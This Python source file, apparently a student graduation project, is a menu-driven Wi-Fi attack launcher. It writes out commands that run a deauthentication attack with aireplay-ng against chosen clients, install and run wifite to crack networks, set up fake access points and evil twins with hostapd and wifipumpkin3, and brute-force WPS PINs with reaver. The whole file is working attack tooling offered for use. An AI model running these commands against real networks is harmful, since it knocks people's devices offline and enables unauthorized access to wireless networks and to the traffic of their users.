import os
import sys
import time
from time import sleep
from platform import system

logo = """\033[33m
                                               
                       _____
                _____ |  ___|
               /  ___\| |_    /\  /\ 
               \  \__    _|  /  \/  \  
                \___  \ |___/        \ 
                __/    \    |  /\/\   | 
                \ _____/____| /    \_/
                
\033[91m        [✔]        Bitirme Projesi        [✔]
\033[97m """

class Main:
    def __init__(self):
        self.logo = logo

    def check_input(self, word, function, keys):
        if word == "":
            self.clear_scr()
            function()

        if not word in keys:
            print('\033[91m Unknown Value..')
            sleep(1)
            self.clear_scr()
            function()

    def menu(self):
        self.clear_scr()
        print(self.logo + """\033[0m 
        \033[97m                
        [01] Information Gathering
        [02] List of Device and Deauthentication Attack
        [03] Wireless Attack via Wifite 
        [04] Create Fake Access Point
        [05] Evil Twin via Wifi Pumpkin
        [06] WPS Attack
        [99] Exit
        """)

        functions_menu = {
            '01':self.info,
            '02':self.deauth,
            '03':self.wifite,
            '04':self.FakeAP,
            '05':self.wifipumkin,
            '06':self.wpsAttack,
            '99':self.exit_app
        }

        choice = input("ENTRY =>> ")

        if len(choice) == 1:
            choice = '0' + choice

        self.check_input(choice, self.menu, functions_menu.keys())
        
        functions_menu[choice]()

    def clear_scr(self):
        os.system('clear')

    def exit_app(self):
        print("Goodbye, come again..")
        sleep(5)
        self.clear_scr()
        sys.exit()

    def info(self):
        self.clear_scr()
        os.system("echo \"Let's check available networks\" |boxes -d mouse -a c")
        choice = input("[1]Show [99]Back > ")

        self.check_input(choice, self.info, ['1','99'])

        if choice == "1":            
            os.system("sudo nmcli -f SSID,BSSID,CHAN,SIGNAL,BARS,SECURITY dev wifi")
            choice = input("[99]Back > ")
            self.check_input(choice, self.info, ['99'])
            #self.info()
        if choice == "99":
            self.menu()

    def deauth(self):
        self.clear_scr()
        os.system("echo \"Listing the devices that are connected to the network and using deauthentication attack on the selected device\"| boxes -d mouse -a c")
        choice = input("[1]Install [2]Run [99]Back > ")

        self.check_input(choice, self.deauth, ['1', '2', '99'])

        if choice == "1":
            os.system("sudo apt install hostapd dnsmasq")
            self.deauth()

        if choice == "2":
            os.system("ifconfig")
            os.system("sudo airmon-ng start wlan0")
            iface= input("Enter interface ->")
            os.system("sudo airodump-ng {0}".format(iface))
            hackableChannel = input("Enter Channel ->")
            hackableBSSID = input("Enter Wi-Fi hotspot BSSID ->")
            firstVar = "sudo airodump-ng --channel {0} --bssid {1} {2}".format(hackableChannel,hackableBSSID,iface)           
            print("Let's see the MAC addresses of the devices. Don't forget! It was called STATION")
            os.system(firstVar)
            #print("Time to deauthentication attack")
            hackableStation = input("Time to deauthentication attack\nEnter STATION ->")
            secondVar = "sudo aireplay-ng --deauth 100 -a {0} -c {1} {2}".format(hackableBSSID,hackableStation,iface)  
            os.system(secondVar)
            sleep(20)
            self.deauth()

        if choice == "99":
            self.menu()

    def wifite(self):
            self.clear_scr()
            os.system("echo \"We can see available WIFI hotspots and connected devices via WIFITE \nNOW \nLET'S HACK THEM\" |boxes -d mouse -a c")
            choice = input("[1]Install [2]Run [99]Back > ")

            self.check_input(choice, self.wifite, ['1', '2', '99'])

            if choice == "1":
                os.system("sudo git clone https://github.com/derv82/wifite2.git")
                os.system("cd wifite2 && sudo python3 setup.py install ; sudo pip3 install -r requirements.txt")
                self.wifite()

            if choice == "2":
                os.system("sudo wifite")
                sleep(20)
                self.wifite()
            if choice == "99":
                self.menu()

    def FakeAP(self):
        self.clear_scr()
        os.system("echo \"TThis option creates fake access point for network\"| boxes -d mouse -a c")
        choice = input("[1]Install [2]Run [99]Back > ")

        self.check_input(choice, self.FakeAP, ['1', '2', '99'])

        if choice == "1":
            os.system("sudo apt install hostapd dnsmasq")
            self.FakeAP()

        if choice == "2":
            os.system("cd /etc/hostapd")
            os.system("sudo nano hostapd.conf")
            os.system("sudo hostapd hostapd.conf")
            sleep(20)
            self.FakeAP()

        if choice == "99":
            self.menu()

    def wifipumkin(self):
        self.clear_scr()
        os.system("echo \"The WiFi-Pumpkin is a rogue AP framework to easily create these fake networks\"| boxes -d mouse -a c")
        choice = input("[1]Install [2]Run [99]Back > ")

        self.check_input(choice, self.wifipumkin, ['1', '2', '99'])

        if choice == "1":
            os.system("sudo apt install libssl-dev libffi-dev build-essential")
            os.system("sudo git clone https://github.com/P0cL4bs/wifipumpkin3.git")
            os.system("chmod -R 755 wifipumpkin3 && cd wifipumpkin3")
            os.system("sudo apt install python3-pyqt5 ")
            os.system("sudo python3 setup.py install")
            self.wifipumkin()

        if choice == "2":
            os.system("sudo wifipumpkin3")
            sleep(20)
            self.wifipumkin()

        if choice == "99":
            self.menu()

    def wpsAttack(self):
        self.clear_scr()
        os.system("echo \"WPS Attack\"| boxes -d mouse -a c")
        choice = input("[1]Install [2]Run [99]Back > ")

        self.check_input(choice, self.wpsAttack, ['1', '2', '99'])

        if choice == "1":
            os.system("sudo apt-get install reaver")
            self.wpsAttack()

        if choice == "2":
            os.system("ifconfig")
            os.system("sudo airmon-ng start wlan0")
            iface= input("Enter interface ->")
            hackableBSSID = input("Enter Wi-Fi hotspot BSSID ->")
            os.system("sudo reaver -i {0} -b {1} -vv".format(iface,hackableBSSID))
            sleep(20)
            self.wpsAttack()

        if choice == "99":
            self.menu()

if __name__ == "__main__":
    run = Main()
    try:
        if system() == 'Linux':
            fpath = "/home/hackingtoolpath.txt"
            try:
                with open(fpath, 'r') as f:
                    archive = f.readline()

                    try:
                        os.chdir(archive)
                        run.menu()

                    # If the directory does not exist
                    except FileNotFoundError:
                        os.mkdir(archive)
                        os.chdir(archive)
                        run.menu()

            except FileNotFoundError:
                os.system('clear')
                run.menu()

                print("""
                        [@] Set Path (All your tools will be install in that directory)
                        [1] Manual 
                        [2] Default
                """)

                choice = input("ENTRY =>> ")

                if choice == "1":
                    inpath = input("Enter Path (with Directory Name) >> ")
                    with open(fpath, "w") as f:
                        f.write(inpath)

                    print("Successfully Path Set...!!")

                if choice == "2":
                    autopath = "/home/hackingtool/"
                    with open(fpath, "w") as f:
                        f.write(autopath)

                    print(f"Your Default Path Is:- {autopath}")
                    sleep(3)

                else:
                    print("Try Again...")

        # If not Linux and probably Windows
        elif system() == "Windows":
            print("\033[91m Please Run This Tool In Debian System For Best Result " "\e[00m")
            time.sleep(5)

        else :
            print("Please Check Your Sytem or Open new issue ...")

    except KeyboardInterrupt:        
        print("\nExiting...")
        sleep(3)
